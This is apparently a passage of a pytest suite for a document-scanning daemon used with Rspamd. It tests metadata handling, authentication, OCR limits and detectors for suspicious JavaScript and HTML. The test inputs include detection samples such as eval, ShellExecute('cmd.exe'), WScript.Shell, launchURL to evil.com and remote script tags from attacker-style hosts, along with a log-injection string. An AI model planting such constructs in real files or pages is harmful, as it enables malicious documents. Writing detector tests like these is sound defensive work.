        assert body["file"]["name"] == "invoice.pdf"

    @pytest.mark.skipif(not _HAS_PYMUPDF, reason="PyMuPDF not installed")
    async def test_metadata_passwords_used_for_decryption(self, client):
        r = await client.post(
            "/v1/scan",
            data=_metadata_form(
                PDF_ENCRYPTED, "enc.pdf", {"passwords": ["wrong", _PDF_ENC_PASSWORD]}
            ),
        )
        assert r.status == 200
        body = await r.json()
        assert body.get("flags", {}).get("decrypted", False) is True

    @pytest.mark.skipif(not _HAS_PYMUPDF, reason="PyMuPDF not installed")
    async def test_metadata_passwords_override_query_param(self, client):
        r = await client.post(
            "/v1/scan?passwords=wrong-only",
            data=_metadata_form(
                PDF_ENCRYPTED, "enc.pdf", {"passwords": [_PDF_ENC_PASSWORD]}
            ),
        )
        assert r.status == 200
        body = await r.json()
        assert body.get("flags", {}).get("decrypted", False) is True

    async def test_metadata_timeout_s_cannot_exceed_query_timeout(self, client):
        r = await client.post(
            "/v1/scan?timeout=5",
            data=_metadata_form(PDF_CLEAN, "clean.pdf", {"timeout_s": 500}),
        )
        assert r.status == 200

    async def test_metadata_rspamd_uid_accepted(self, client, caplog):
        with caplog.at_level(logging.INFO):
            r = await client.post(
                "/v1/scan",
                data=_metadata_form(
                    PDF_CLEAN,
                    "clean.pdf",
                    {"rspamd_uid": "7f3a9c1e-abcd", "queue_id": "4X2n3q-000abc"},
                ),
            )
        assert r.status == 200
        assert any("7f3a9c1e" in rec.message for rec in caplog.records)

    @pytest.mark.skipif(not _HAS_ZSTD_TEST, reason="zstandard not installed")
    async def test_metadata_zstd_file_part_decompresses(self, client):
        compressed = _zstd_compress(PDF_CLEAN)
        r = await client.post(
            "/v1/scan", data=_metadata_form(compressed, "clean.pdf.zst", {})
        )
        assert r.status == 200
        body = await r.json()
        assert body["file"]["type"] == "pdf"
        assert body["file"]["name"] == "clean.pdf"

    async def test_metadata_same_hash_as_legacy_doc_part(self, client):
        r1 = await client.post("/v1/scan", data=_form(PDF_CLEAN, "clean.pdf"))
        r2 = await client.post(
            "/v1/scan", data=_metadata_form(PDF_CLEAN, "clean.pdf", {})
        )
        b1, b2 = await r1.json(), await r2.json()
        assert b1["file"]["sha256"] == b2["file"]["sha256"]

    @pytest.mark.parametrize("transfer_encoding", ["base64", "quoted-printable"])
    async def test_file_content_transfer_encoding_is_decoded(
        self, client, transfer_encoding
    ):
        body, headers = _raw_metadata_multipart(
            PDF_CLEAN, {}, transfer_encoding=transfer_encoding
        )
        r = await client.post("/v1/scan", data=body, headers=headers)
        assert r.status == 200
        result = await r.json()
        assert result["file"]["sha256"] == hashlib.sha256(PDF_CLEAN).hexdigest()
        assert result["file"]["type"] == "pdf"

    async def test_metadata_content_transfer_encoding_is_decoded(self, client):
        body, headers = _raw_metadata_multipart(
            PDF_CLEAN,
            {"rspamd_uid": "base64-metadata"},
            metadata_transfer_encoding="base64",
        )
        r = await client.post("/v1/scan", data=body, headers=headers)
        assert r.status == 200
        result = await r.json()
        assert result["request"]["rspamd_uid"] == "base64-metadata"

    @pytest.mark.skipif(not _HAS_PYMUPDF, reason="PyMuPDF not installed")
    async def test_metadata_passwords_are_stripped(self, client):
        """A password with incidental whitespace must still decrypt (regression:
        metadata passwords used to keep the raw, un-stripped string)."""
        r = await client.post(
            "/v1/scan",
            data=_metadata_form(
                PDF_ENCRYPTED,
                "enc.pdf",
                {"passwords": [f"  {_PDF_ENC_PASSWORD}\n"]},
            ),
        )
        assert r.status == 200
        body = await r.json()
        assert body.get("flags", {}).get("decrypted", False) is True

    async def test_metadata_string_fields_strip_control_chars(self, client):
        """Control characters in logged/echoed metadata fields must not survive
        (regression: log injection via unsanitized rspamd_uid/message_id)."""
        r = await client.post(
            "/v1/scan",
            data=_metadata_form(
                PDF_CLEAN,
                "clean.pdf",
                {
                    "rspamd_uid": "abc\ndef",
                    "message_id": "<x>\r\nFAKE LOG LINE",
                },
            ),
        )
        assert r.status == 200
        body = await r.json()
        assert "\n" not in body["request"]["rspamd_uid"]
        assert "\n" not in body["request"]["message_id"]
        assert "\r" not in body["request"]["message_id"]

    async def test_correlation_ids_echoed_in_response(self, client):
        r = await client.post(
            "/v1/scan",
            data=_metadata_form(
                PDF_CLEAN,
                "clean.pdf",
                {
                    "rspamd_uid": "7f3a9c1e-abcd",
                    "queue_id": "4X2n3q-000abc",
                    "message_id": "<abc123@example.com>",
                },
            ),
        )
        assert r.status == 200
        body = await r.json()
        assert body["request"] == {
            "rspamd_uid": "7f3a9c1e-abcd",
            "queue_id": "4X2n3q-000abc",
            "message_id": "<abc123@example.com>",
        }

    async def test_no_correlation_ids_means_no_request_block(self, client):
        r = await client.post(
            "/v1/scan", data=_metadata_form(PDF_CLEAN, "clean.pdf", {})
        )
        assert r.status == 200
        body = await r.json()
        assert "request" not in body

    async def test_correlation_ids_not_leaked_into_other_requests_cache_hit(
        self, client
    ):
        """The request block must not leak into an unrelated cache-hit response
        for the same file content submitted without correlation IDs."""
        r1 = await client.post(
            "/v1/scan",
            data=_metadata_form(
                PDF_CLEAN, "shared.pdf", {"rspamd_uid": "requester-one"}
            ),
        )
        assert r1.status == 200
        r2 = await client.post(
            "/v1/scan", data=_metadata_form(PDF_CLEAN, "shared.pdf", {})
        )
        assert r2.status == 200
        body2 = await r2.json()
        assert "request" not in body2 or "rspamd_uid" not in body2.get("request", {})

    async def test_correlation_ids_not_leaked_via_query_in_memory_cache(self, client):
        """Regression: the finished-report object returned by analyze_task()
        is the same object stored in self.tasks[file_hash] for /v1/query
        lookups. Attaching the request block must not mutate that shared
        object, or a later, unrelated /v1/query poll for the same hash would
        return the first requester's correlation IDs."""
        r1 = await client.post(
            "/v1/scan",
            data=_metadata_form(
                PDF_CLEAN, "queried.pdf", {"rspamd_uid": "requester-one"}
            ),
        )
        assert r1.status == 200
        body1 = await r1.json()
        assert body1["request"]["rspamd_uid"] == "requester-one"
        file_hash = body1["file"]["sha256"]

        r2 = await client.get(f"/v1/query?hash={file_hash}")
        assert r2.status == 200
        body2 = await r2.json()
        assert "request" not in body2["report"]

    async def test_read_bytes_log_line_carries_correlation_tag(self, client, caplog):
        """The file-part 'read N bytes' log line must carry the uid= tag too
        (regression: the tag used to be attached only after the whole
        multipart body was read, so the earliest log line missed it)."""
        with caplog.at_level(logging.INFO):
            r = await client.post(
                "/v1/scan",
                data=_metadata_form(
                    PDF_CLEAN, "clean.pdf", {"rspamd_uid": "7f3a9c1e-tagtest"}
                ),
            )
        assert r.status == 200
        read_bytes_lines = [
            rec.message for rec in caplog.records if "read " in rec.message
        ]
        assert read_bytes_lines
        assert any("uid=7f3a9c1e-t" in line for line in read_bytes_lines)

    async def test_empty_file_part_still_logs_read_bytes_line(self, client, caplog):
        """The 'read N bytes' log line must still fire for an empty upload
        (regression: it used to be emitted only after the empty-body check,
        so the empty-upload failure case — where the line matters most for
        diagnosing what a client actually sent — never logged it)."""
        with caplog.at_level(logging.INFO):
            r = await client.post(
                "/v1/scan",
                data=_metadata_form(b"", "empty.pdf", {}),
            )
        assert r.status == 400
        read_bytes_lines = [
            rec.message for rec in caplog.records if "read 0 bytes" in rec.message
        ]
        assert read_bytes_lines

    async def test_file_first_log_line_carries_correlation_tag(self, client, caplog):
        body, headers = _raw_metadata_multipart(
            PDF_CLEAN, {"rspamd_uid": "7f3a9c1e-file-first"}, file_first=True
        )
        with caplog.at_level(logging.INFO):
            r = await client.post("/v1/scan", data=body, headers=headers)
        assert r.status == 200
        read_bytes_lines = [
            rec.message for rec in caplog.records if "read " in rec.message
        ]
        assert read_bytes_lines
        assert any("uid=7f3a9c1e-f" in line for line in read_bytes_lines)


class _ClientResponseStub:
    def __init__(self, status, body):
        self.status = status
        self._body = body

    async def __aenter__(self):
        return self

    async def __aexit__(self, exc_type, exc, tb):
        return False

    async def json(self, content_type=None):
        return self._body


class _ClientSessionStub:
    def __init__(self, status, body):
        self._status = status
        self._body = body
        self.last_call: tuple[tuple, dict] | None = None

    def post(self, *args, **kwargs):
        self.last_call = (args, kwargs)
        return _ClientResponseStub(self._status, self._body)


class TestClientPolling:
    def test_normalize_result_payload_unwraps_query_response(self):
        payload = {
            "status": "finished",
            "report": {
                "file_hash": "abc",
                "detected_type": "pdf",
                "analyses": [],
            },
        }
        result = xspct_client._normalize_result_payload(payload)
        assert result["status"] == "finished"
        assert result["file_hash"] == "abc"
        assert "report" not in result

    @pytest.mark.asyncio
    async def test_scan_file_poll_returns_flat_report(self, tmp_path, monkeypatch):
        sample = tmp_path / "sample.pdf"
        sample.write_bytes(b"%PDF-1.4\n")

        async def _fake_poll_result(session, base_url, file_hash, headers, interval):
            return {
                "status": "finished",
                "report": {
                    "file_hash": file_hash,
                    "filename": sample.name,
                    "detected_type": "pdf",
                    "analyses": [],
                    "iocs": {"urls": [], "ips": [], "domains": []},
                },
            }

        monkeypatch.setattr(xspct_client, "_poll_result", _fake_poll_result)
        session = _ClientSessionStub(
            202, {"status": "processing", "file_hash": "deadbeef"}
        )

        result = await xspct_client.scan_file(
            session=session,
            path=sample,
            base_url="http://localhost:8080",
            timeout=1,
            passwords=None,
            api_key=None,
            poll=True,
            poll_interval=0,
            no_color=True,
        )

        assert result is not None
        assert result["status"] == "finished"
        assert result["file_hash"] == "deadbeef"
        assert result["detected_type"] == "pdf"


def _field_names(form: aiohttp.FormData) -> list[str]:
    return [part_headers["name"] for part_headers, _headers, _value in form._fields]


class TestClientMultipartShape:
    @pytest.mark.asyncio
    async def test_default_uses_metadata_and_file_parts(self, tmp_path):
        sample = tmp_path / "sample.pdf"
        sample.write_bytes(b"%PDF-1.4\n")
        session = _ClientSessionStub(200, {"status": "finished"})

        await xspct_client.scan_file(
            session=session,
            path=sample,
            base_url="http://localhost:8080",
            timeout=1,
            passwords="pw1,pw2",
            api_key=None,
            poll=False,
            poll_interval=0,
            no_color=True,
            force_analyzers="image.ocr",
            rspamd_uid="7f3a9c1e-abcd",
            queue_id="4X2n3q-000abc",
        )

        assert session.last_call is not None
        _args, kwargs = session.last_call
        names = _field_names(kwargs["data"])
        assert names == ["metadata", "file"]
        assert "force_analyzers" not in kwargs["params"]

        metadata_value = kwargs["data"]._fields[0][2]
        metadata = json.loads(metadata_value)
        assert metadata["filename"] == "sample.pdf"
        assert metadata["passwords"] == ["pw1", "pw2"]
        assert metadata["force_analyzers"] == ["image.ocr"]
        assert metadata["rspamd_uid"] == "7f3a9c1e-abcd"
        assert metadata["queue_id"] == "4X2n3q-000abc"

    @pytest.mark.asyncio
    async def test_legacy_multipart_uses_doc_part_and_query_params(self, tmp_path):
        sample = tmp_path / "sample.pdf"
        sample.write_bytes(b"%PDF-1.4\n")
        session = _ClientSessionStub(200, {"status": "finished"})

        await xspct_client.scan_file(
            session=session,
            path=sample,
            base_url="http://localhost:8080",
            timeout=1,
            passwords="pw1,pw2",
            api_key=None,
            poll=False,
            poll_interval=0,
            no_color=True,
            force_analyzers="image.ocr",
            legacy_multipart=True,
        )

        assert session.last_call is not None
        _args, kwargs = session.last_call
        names = _field_names(kwargs["data"])
        assert names == ["doc", "passwords"]
        assert kwargs["params"]["force_analyzers"] == "image.ocr"


class TestAuthentication:
    async def test_health_no_auth_required(self, auth_client):
        """Health endpoint carries no auth check and must always return 200."""
        r = await auth_client.get("/health")
        assert r.status == 200

    async def test_scan_no_key_returns_401(self, auth_client):
        r = await auth_client.post("/v1/scan", data=_form(PDF_CLEAN, "auth.pdf"))
        assert r.status == 401

    async def test_query_get_no_key_returns_401(self, auth_client):
        r = await auth_client.get("/v1/query?hash=abc")
        assert r.status == 401

    async def test_query_post_no_key_returns_401(self, auth_client):
        r = await auth_client.post("/v1/query", json={"hash": "abc"})
        assert r.status == 401

    async def test_metrics_no_key_returns_401(self, auth_client):
        r = await auth_client.get("/v1/metrics")
        assert r.status == 401

    async def test_scan_correct_key_returns_200(self, auth_client):
        r = await auth_client.post(
            "/v1/scan",
            headers={"X-Api-Key": "test-secret-key"},
            data=_form(PDF_CLEAN, "auth.pdf"),
        )
        assert r.status == 200

    async def test_scan_wrong_key_returns_401(self, auth_client):
        r = await auth_client.post(
            "/v1/scan",
            headers={"X-Api-Key": "totally-wrong"},
            data=_form(PDF_CLEAN, "auth.pdf"),
        )
        assert r.status == 401

    async def test_query_correct_key_returns_404_not_401(self, auth_client):
        """After auth passes, unknown hash → 404 (not 401)."""
        r = await auth_client.get(
            "/v1/query?hash=" + "c" * 64,
            headers={"X-Api-Key": "test-secret-key"},
        )
        assert r.status == 404

    async def test_metrics_correct_key_returns_200(self, auth_client):
        r = await auth_client.get(
            "/v1/metrics",
            headers={"X-Api-Key": "test-secret-key"},
        )
        assert r.status == 200


# ===========================================================================
# UNIT TESTS — analyze_javascript
# ===========================================================================


class TestAnalyzeJavascript:
    def test_empty_string_returns_empty(self, daemon):
        assert daemon.analyze_javascript("") == []

    def test_whitespace_only_returns_empty(self, daemon):
        assert daemon.analyze_javascript("   \n\t  ") == []

    def test_eval_detected(self, daemon):
        hits = daemon.analyze_javascript('eval("alert(1)")')
        keywords = {h["keyword"] for h in hits}
        assert "eval()" in keywords

    def test_unescape_detected(self, daemon):
        hits = daemon.analyze_javascript('var x = unescape("%41%42")')
        keywords = {h["keyword"] for h in hits}
        assert "unescape()" in keywords

    def test_atob_detected(self, daemon):
        hits = daemon.analyze_javascript('atob("aGVsbG8=")')
        keywords = {h["keyword"] for h in hits}
        assert "atob()" in keywords

    def test_string_from_char_code_detected(self, daemon):
        hits = daemon.analyze_javascript("String.fromCharCode(65,66,67)")
        keywords = {h["keyword"] for h in hits}
        assert "String.fromCharCode" in keywords

    def test_document_write_detected(self, daemon):
        hits = daemon.analyze_javascript('document.write("<b>x</b>")')
        keywords = {h["keyword"] for h in hits}
        assert "document.write()" in keywords

    def test_export_data_object_detected(self, daemon):
        hits = daemon.analyze_javascript('this.exportDataObject({cName:"x"})')
        keywords = {h["keyword"] for h in hits}
        assert "exportDataObject()" in keywords

    def test_launch_url_detected(self, daemon):
        hits = daemon.analyze_javascript('app.launchURL("http://evil.com")')
        keywords = {h["keyword"] for h in hits}
        assert "app.launchURL()" in keywords

    def test_open_doc_detected(self, daemon):
        hits = daemon.analyze_javascript('app.openDoc("/tmp/x.pdf")')
        keywords = {h["keyword"] for h in hits}
        assert "app.openDoc()" in keywords

    def test_util_printf_detected(self, daemon):
        hits = daemon.analyze_javascript('util.printf("%s", x)')
        keywords = {h["keyword"] for h in hits}
        assert "util.printf()" in keywords

    def test_activex_detected(self, daemon):
        hits = daemon.analyze_javascript('new ActiveXObject("WScript.Shell")')
        keywords = {h["keyword"] for h in hits}
        assert "ActiveXObject" in keywords

    def test_wscript_detected(self, daemon):
        hits = daemon.analyze_javascript('WScript.Echo("hello")')
        keywords = {h["keyword"] for h in hits}
        assert "WScript" in keywords

    def test_shell_execute_detected(self, daemon):
        hits = daemon.analyze_javascript('ShellExecute("cmd.exe")')
        keywords = {h["keyword"] for h in hits}
        assert "ShellExecute" in keywords

    def test_source_label_in_description(self, daemon):
        hits = daemon.analyze_javascript('eval("x")', source_label="PDF /OpenAction")
        assert any("PDF /OpenAction" in h["description"] for h in hits)

    def test_clean_js_returns_empty(self, daemon):
        clean = "function add(a, b) { return a + b; }\nvar result = add(1, 2);"
        assert daemon.analyze_javascript(clean) == []

    def test_returns_list(self, daemon):
        result = daemon.analyze_javascript("var x = 1;")
        assert isinstance(result, list)

    def test_no_duplicate_hits(self, daemon):
        # Two eval() calls → still one entry
        hits = daemon.analyze_javascript('eval("a"); eval("b");')
        keywords = [h["keyword"] for h in hits if h["keyword"] == "eval()"]
        assert len(keywords) == 1

    def test_type_field_is_suspiciousjs(self, daemon):
        hits = daemon.analyze_javascript('eval("x")')
        assert hits[0]["type"] == "SuspiciousJS"


# ===========================================================================
# UNIT TESTS — analyze_image
# ===========================================================================

try:
    from PIL import Image as _TestPIL

    _HAS_PIL_FOR_TESTS = True
except ImportError:
    _HAS_PIL_FOR_TESTS = False


def _make_png(width: int = 50, height: int = 50, color: str = "white") -> bytes:
    """Create a minimal in-memory PNG for testing."""
    buf = io.BytesIO()
    img = _TestPIL.new("RGB", (width, height), color=color)
    img.save(buf, format="PNG")
    return buf.getvalue()


class TestAnalyzeImage:
    def test_empty_bytes_returns_empty_structure(self, daemon):
        r = daemon.analyze_image(b"")
        assert r["ocr_text"] == []
        assert r["qr_codes"] == []
        assert r["analyses"] == []
        assert r["iocs"] == {"urls": [], "ips": [], "domains": []}

    def test_invalid_bytes_returns_empty_structure(self, daemon):
        r = daemon.analyze_image(b"this is not an image at all XXXX")
        assert r["ocr_text"] == []
        assert r["qr_codes"] == []

    def test_return_structure_keys(self, daemon):
        r = daemon.analyze_image(b"")
        assert {"ocr_text", "qr_codes", "analyses", "iocs"} <= set(r.keys())
        assert set(r["iocs"].keys()) == {"urls", "ips", "domains"}

    @pytest.mark.skipif(not _HAS_PIL_FOR_TESTS, reason="Pillow not installed")
    def test_blank_png_does_not_raise(self, daemon):
        png = _make_png()
        r = daemon.analyze_image(png, label="test blank")
        assert isinstance(r["ocr_text"], list)
        assert isinstance(r["qr_codes"], list)
        assert isinstance(r["analyses"], list)

    @pytest.mark.skipif(not _HAS_PIL_FOR_TESTS, reason="Pillow not installed")
    def test_label_appears_in_log_but_not_analyses_for_blank(self, daemon):
        png = _make_png()
        # Blank white image has no QR codes and no meaningful OCR text
        r = daemon.analyze_image(png, label="blank-test")
        # No QR codes in a blank image
        assert r["qr_codes"] == []


# ===========================================================================
# UNIT TESTS — analyze_html extras (RemoteScriptInjection, inline JS wiring)
# ===========================================================================


class TestAnalyzeHtmlExtras:
    def test_remote_script_injection_tracker_script_detected(self, daemon):
        data = (
            b"<html><body>"
            b'<script src="https://track.evil.com/?u=Ab3Cd7Ef"></script>'
            b"</body></html>"
        )
        r = daemon.analyze_html(data)
        types = {a["type"] for a in r["analyses"]}
        assert "RemoteScriptInjection" in types

    def test_remote_script_injection_keyword(self, daemon):
        data = b'<html><script src="https://evil.com/?u=ABCDEFGH"></script></html>'
        r = daemon.analyze_html(data)
        kw = {a["keyword"] for a in r["analyses"]}
        assert "script-tracker-url" in kw

    def test_remote_script_injection_not_triggered_without_u_param(self, daemon):
        data = b'<html><script src="https://cdn.example.com/lib.js"></script></html>'
        r = daemon.analyze_html(data)
        types = {a["type"] for a in r["analyses"]}
        assert "RemoteScriptInjection" not in types

    def test_external_script_detected(self, daemon):
        data = (
            b'<html><script src="http://evil.com/script.php?id=loader"></script></html>'
        )
        r = daemon.analyze_html(data)
        types = {a["type"] for a in r["analyses"]}
        assert "ExternalScript" in types

    def test_external_script_keyword(self, daemon):
        data = b'<html><script src="https://track.bad.net/t.js"></script></html>'
        r = daemon.analyze_html(data)
        kw = {a["keyword"] for a in r["analyses"]}
        assert "external-script-src" in kw

    def test_tracker_url_not_double_counted_as_external(self, daemon):
        # A ?u= tracker URL should produce RemoteScriptInjection but NOT also ExternalScript
        data = (
            b'<html><script src="https://track.evil.com/?u=Ab3Cd7Ef"></script></html>'
        )
        r = daemon.analyze_html(data)
        types = [a["type"] for a in r["analyses"]]
        assert types.count("RemoteScriptInjection") == 1
        # ExternalScript should NOT appear because the URL is already in tracker_scripts
        assert "ExternalScript" not in types

    def test_inline_script_eval_triggers_suspicious_js(self, daemon):
        data = b'<html><script>eval("alert(1)")</script></html>'
        r = daemon.analyze_html(data)
        keywords = {a["keyword"] for a in r["analyses"] if a["type"] == "SuspiciousJS"}
        assert "eval()" in keywords

    def test_inline_script_atob_triggers_suspicious_js(self, daemon):
        data = b'<html><script>var x = atob("aGVsbG8=");</script></html>'
        r = daemon.analyze_html(data)
        keywords = {a["keyword"] for a in r["analyses"] if a["type"] == "SuspiciousJS"}
        assert "atob()" in keywords

    def test_inline_script_no_duplicates(self, daemon):
        # eval() appears both in old static check and new analyze_javascript wiring
        data = b'<html><script>eval("x")</script></html>'
        r = daemon.analyze_html(data)
        eval_hits = [
            a
            for a in r["analyses"]
            if a["type"] == "SuspiciousJS" and a["keyword"] == "eval()"
        ]
        # Must not be duplicated; keyword from analyze_javascript has source_label appended
        # but keyword from the old static check is bare — either 1 or 2 OK but count sanity
        assert len(eval_hits) >= 1

    @pytest.mark.skipif(not _HAS_PIL_FOR_TESTS, reason="Pillow not installed")
    def test_data_uri_image_processed_without_crash(self, daemon):
        import base64

        png = _make_png(10, 10)
        b64 = base64.b64encode(png).decode()
        data = f'<html><body><img src="data:image/png;base64,{b64}"></body></html>'.encode()
        # Should not raise regardless of HAS_OCR/HAS_PYZBAR
        r = daemon.analyze_html(data)
        assert r is not None
        assert "analyses" in r


# ===========================================================================
# UNIT TESTS — TextExtractorRtf
# ===========================================================================


class TestTextExtractorRtf:
    def test_minimal_rtf_extracts_text(self):
        rtf = b"{\\rtf1\\ansi {\\fonttbl} Hello World}"
        te = xspct.TextExtractorRtf(rtf)
        text = te.get_text()
        # The RTF parser may or may not produce text from this minimal sample;
        # the important thing is that it runs without exception and returns a string.
        assert isinstance(text, str)

    def test_empty_rtf_does_not_raise(self):
        te = xspct.TextExtractorRtf(b"{\\rtf1}")
        result = te.get_text()
        assert isinstance(result, str)

    def test_all_text_list_populated(self):
        rtf = b"{\\rtf1 hello}"
        te = xspct.TextExtractorRtf(rtf)
        te.parse()
        assert isinstance(te.all_text, list)


# ===========================================================================
# UNIT TESTS — load_config
# ===========================================================================
# UNIT TESTS — Rspamd digest
# ===========================================================================


class TestOcrGate:
    """Unit tests for the image OCR exclusion gates."""

    def _make_tiny_jpeg(self) -> bytes:
        """1×1 white JPEG, ~300 bytes — always below every size gate."""
        import io as _io

        from PIL import Image as _PIL

        buf = _io.BytesIO()
        _PIL.new("RGB", (1, 1), color=(255, 255, 255)).save(buf, format="JPEG")
        return buf.getvalue()

    def test_ocr_gate_max_bytes_triggers(self, daemon, monkeypatch):
        monkeypatch.setitem(
            xspct.config["xspct_analyzers"]["image"], "ocr_max_bytes", 10
        )
        data = b"\xff\xd8\xff" + b"X" * 100  # fake JPEG magic, 103 bytes > 10
        result = daemon.analyze_image(data, label="big.jpg")
        assert "image.ocr" in result.get("exclusions", {})
        assert "ocr_max_bytes" in result["exclusions"]["image.ocr"]

    def test_ocr_gate_max_bytes_force_override(self, daemon, monkeypatch):
        monkeypatch.setitem(
            xspct.config["xspct_analyzers"]["image"], "ocr_max_bytes", 10
        )
        tiny = self._make_tiny_jpeg()
        # Even a tiny file would be excluded by the 10-byte gate; force bypasses it
        result = daemon.analyze_image(
            tiny, label="tiny.jpg", force_analyzers=frozenset({"image.ocr"})
        )
        assert "exclusions" not in result

    def test_ocr_gate_disabled_when_zero(self, daemon, monkeypatch):
        monkeypatch.setitem(
            xspct.config["xspct_analyzers"]["image"], "ocr_max_bytes", 0
        )
        monkeypatch.setitem(
            xspct.config["xspct_analyzers"]["image"], "ocr_max_pixels", 0
        )
        monkeypatch.setitem(
            xspct.config["xspct_analyzers"]["image"], "ocr_skip_camera", False
        )
        tiny = self._make_tiny_jpeg()
        result = daemon.analyze_image(tiny, label="tiny.jpg")
        assert "image.ocr" not in result.get("exclusions", {})

    def test_scan_exclusions_in_v2_report(self, daemon, monkeypatch):
        monkeypatch.setitem(
            xspct.config["xspct_analyzers"]["image"], "ocr_max_bytes", 1
        )
        monkeypatch.setitem(
            xspct.config["xspct_analyzers"]["image"], "ocr_max_pixels", 0
        )
        monkeypatch.setitem(
            xspct.config["xspct_analyzers"]["image"], "ocr_skip_camera", False
        )
        tiny = self._make_tiny_jpeg()
        # sync_analyze stays v1 — check scan_exclusions in the v1 report
        r = daemon.sync_analyze("<t>", "big.jpg", tiny, "image/jpeg")
        assert r.get("scan_exclusions", {}).get("image.ocr")

    def test_force_analyzers_in_http_query(self):

        # Verify the comma-split logic that handle_scan applies
        raw = "image.ocr,image.qr"
        fa = frozenset(a.strip() for a in raw.split(",") if a.strip())
        assert "image.ocr" in fa
        assert "image.qr" in fa


class TestImageCountLimit:
    """Unit tests for the max_images_per_document document-level cap."""

    def test_default_limit_is_twenty(self, daemon):
        assert daemon._embedded_image_limit() == 20

    def test_limit_reads_config_override(self, daemon, monkeypatch):
        monkeypatch.setitem(
            xspct.config["xspct_analyzers"]["image"], "max_images_per_document", 5
        )
        assert daemon._embedded_image_limit() == 5

    def test_zero_means_unlimited(self, daemon, monkeypatch):
        monkeypatch.setitem(
            xspct.config["xspct_analyzers"]["image"], "max_images_per_document", 0
        )
        assert daemon._embedded_image_limit() == 0

    def test_negative_limit_is_normalized_to_unlimited(self, daemon, monkeypatch):
        monkeypatch.setitem(
            xspct.config["xspct_analyzers"]["image"], "max_images_per_document", -1
        )
        assert daemon._embedded_image_limit() == 0

    @pytest.mark.skipif(
        not (xspct.HAS_OCR or xspct.HAS_PYZBAR),
        reason="requires OCR or QR backend to run the image-extraction loop",
    )
    @pytest.mark.skipif(not _HAS_PIL_FOR_TESTS, reason="Pillow not installed")
    def test_html_data_uri_images_capped(self, daemon, monkeypatch):
        import base64

        monkeypatch.setitem(
            xspct.config["xspct_analyzers"]["image"], "max_images_per_document", 2
        )
        png = _make_png(10, 10)
        b64 = base64.b64encode(png).decode()
        imgs = "".join(f'<img src="data:image/png;base64,{b64}">' for _ in range(5))
        data = f"<html><body>{imgs}</body></html>".encode()
        analyze_image = MagicMock(return_value={"analyses": [], "iocs": {}})
        monkeypatch.setattr(daemon, "analyze_image", analyze_image)
        r = daemon.analyze_html(data)
        assert r is not None
        assert analyze_image.call_count == 2
        limit_hits = [
            a
            for a in r["analyses"]
            if a["type"] == "ScanLimit"
            and a["keyword"] == "max-images-per-document:html-image"
        ]
        assert len(limit_hits) == 1

    @pytest.mark.skipif(not _HAS_PYMUPDF, reason="PyMuPDF not installed")
    def test_pdf_at_limit_is_not_reported_as_truncated(self, daemon, monkeypatch):
        monkeypatch.setattr(xspct, "HAS_OCR", True)
        monkeypatch.setattr(xspct, "HAS_PYZBAR", False)
        monkeypatch.setitem(
            xspct.config["xspct_analyzers"]["image"], "max_images_per_document", 2
        )
        image = _make_png(10, 10)
        document = _pymupdf.open()
        page = document.new_page()
        page.insert_image((0, 0, 10, 10), stream=image)
        page.insert_image((20, 0, 30, 10), stream=image)
        data = document.tobytes()
        document.close()
        analyze_image = MagicMock(return_value={"analyses": [], "iocs": {}})
        monkeypatch.setattr(daemon, "analyze_image", analyze_image)
        r = daemon.analyze_pdf(data)
        assert r is not None
        assert analyze_image.call_count == 2
        assert not any(a["type"] == "ScanLimit" for a in r["analyses"])

    @pytest.mark.skipif(not _HAS_PYMUPDF, reason="PyMuPDF not installed")
    def test_pdf_limit_identifies_pdf_image_source(self, daemon, monkeypatch):
        monkeypatch.setattr(xspct, "HAS_OCR", True)
        monkeypatch.setattr(xspct, "HAS_PYZBAR", False)
        monkeypatch.setitem(
            xspct.config["xspct_analyzers"]["image"], "max_images_per_document", 2
        )
        image = _make_png(10, 10)
        document = _pymupdf.open()
        page = document.new_page()
        for left in (0, 20, 40):
            page.insert_image((left, 0, left + 10, 10), stream=image)
        data = document.tobytes()
        document.close()
        analyze_image = MagicMock(return_value={"analyses": [], "iocs": {}})
        monkeypatch.setattr(daemon, "analyze_image", analyze_image)
        r = daemon.analyze_pdf(data)
        assert r is not None
        assert analyze_image.call_count == 2
        assert any(
            a["keyword"] == "max-images-per-document:pdf-image" for a in r["analyses"]
        )

    @pytest.mark.parametrize(
        ("member_prefix", "source"),
        [
            ("word/media", "ooxml-image"),
            ("Pictures", "odf-image"),
        ],
    )
    def test_zip_image_limit_identifies_source(
        self, daemon, monkeypatch, member_prefix, source
    ):
        monkeypatch.setitem(
            xspct.config["xspct_analyzers"]["image"], "max_images_per_document", 2
        )
        image = _make_png(10, 10)
        archive = io.BytesIO()
        with zipfile.ZipFile(archive, "w") as z:
            for number in range(3):
                z.writestr(f"{member_prefix}/image{number}.png", image)
        report = daemon._make_base_report("document", "hash", None, None)
        analyze_image = MagicMock(return_value={"analyses": [], "iocs": {}})
        monkeypatch.setattr(daemon, "analyze_image", analyze_image)
        extractor = (
            daemon._extract_ooxml_images
            if source == "ooxml-image"
            else daemon._extract_odf_images
        )
        extractor("<test>", archive.getvalue(), report)
        assert analyze_image.call_count == 2
        assert any(
            a["keyword"] == f"max-images-per-document:{source}"
            for a in report["analyses"]
        )


# ===========================================================================
# UNIT TESTS — Rspamd digest
# ===========================================================================


class TestRspamdDigest:
    def test_key_is_64_bytes(self):
        """The Rspamd key is BLAKE2b-512 of b'rspamd' = 64 bytes."""
        import hashlib

        assert len(hashlib.blake2b(b"rspamd").digest()) == 64

    def test_digest_length(self):
        """Result is always 128 hex chars (64 bytes = BLAKE2b-512)."""
        assert len(xspct._rspamd_digest(b"")) == 128
        assert len(xspct._rspamd_digest(b"hello")) == 128

    def test_digest_deterministic(self):
        data = b"test attachment content"
        assert xspct._rspamd_digest(data) == xspct._rspamd_digest(data)

    def test_digest_differs_from_plain_blake2b(self):
        import hashlib

        data = b"some data"
        plain = hashlib.blake2b(data).hexdigest()
        keyed = xspct._rspamd_digest(data)
        assert plain != keyed  # keyed != unkeyed

    def test_digest_in_file_section(self):
        """Finished v2 report contains a non-empty rspamd_digest in file section."""
        d = xspct.InspectorDaemon()
        v1 = d._make_base_report("test.pdf", "a" * 64, "application/pdf", "PDF")
        v1["detected_type"] = "pdf"
        v1["text_preview"] = []
        v1["text_full"] = []
        rdigest = xspct._rspamd_digest(PDF_CLEAN)
        v2 = d._to_v2_report(
            v1, "test.pdf", len(PDF_CLEAN), sha1="deadbeef", rspamd_digest=rdigest
        )
        assert v2["file"]["rspamd_digest"] == rdigest
        assert len(v2["file"]["rspamd_digest"]) == 128


# ===========================================================================
# UNIT TESTS — load_config
# ===========================================================================


class TestLoadConfig:
    def test_none_path_is_noop(self):
